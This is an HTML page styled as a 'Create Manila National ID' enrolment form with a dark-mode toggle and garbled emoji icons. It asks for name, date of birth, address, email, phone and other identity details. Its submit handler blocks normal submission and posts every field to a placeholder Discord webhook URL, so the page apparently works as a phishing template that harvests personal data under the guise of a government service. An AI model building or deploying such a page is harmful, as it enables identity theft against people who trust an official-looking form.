<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manila National ID</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div id="dark-mode-toggle">
    <input type="checkbox" class="toggle" id="toggle-dark-mode">
    <label class="toggle-label" for="toggle-dark-mode">
        <span class="sun-icon">  üåô</span>
        <span class="moon-icon">‚òÄÔ∏è  </span>
    </label>
</div>

<div id="national-id-form" class="form-container">
    <h1>Create Manila National ID</h1>
    <form id="nationalIdForm">
        <div class="form-group">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>
        </div>
        <div class="form-group">
            <label for="nationality">Nationality:</label>
            <input type="text" id="nationality" name="nationality" required>
        </div>
        <div class="form-group">
            <label for="dob">Date of Birth:</label>
            <input type="date" id="dob" name="dob" required>
        </div>
        <div class="form-group">
            <label for="gender">Gender:</label>
            <select id="gender" name="gender" required>
                <option value="">Select Gender</option>
                <option value="male">Male</option>
                <option value="female">Female</option>
                <option value="other">Other</option>
            </select>
        </div>
        <div class="form-group">
            <label for="occupation">Occupation:</label>
            <input type="text" id="occupation" name="occupation" required>
        </div>
        <div class="form-group">
            <label for="address">Address:</label>
            <input type="text" id="address" name="address" required>
        </div>
        <div class="form-group">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
        </div>
        <div class="form-group">
            <label for="phone">Phone Number:</label>
            <input type="tel" id="phone" name="phone" required>
        </div>
        <button type="submit">Create National ID</button>
    </form>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const darkModeToggle = document.getElementById('toggle-dark-mode');
        const body = document.body;

        darkModeToggle.addEventListener('change', function() {
            body.classList.toggle('dark-mode');
        });
    });

    document.getElementById('nationalIdForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission
        
        // Your existing form submission code here

        // Example of sending data to the webhook
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "YOUR_WEBHOOK_URL_HERE", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            name: document.getElementById('name').value,
            nationality: document.getElementById('nationality').value,
            dob: document.getElementById('dob').value,
            gender: document.getElementById('gender').value,
            occupation: document.getElementById('occupation').value,
            address: document.getElementById('address').value,
            email: document.getElementById('email').value,
            phone: document.getElementById('phone').value
        }));

        // Optionally, you can handle success/failure response from the server
        xhr.onload = function() {
            if (xhr.status == 200) {
                alert('Data sent to Discord webhook successfully!');
            } else {
                alert('Failed to send data to Discord webhook.');
            }
        };
    });
</script>

</body>
</html>
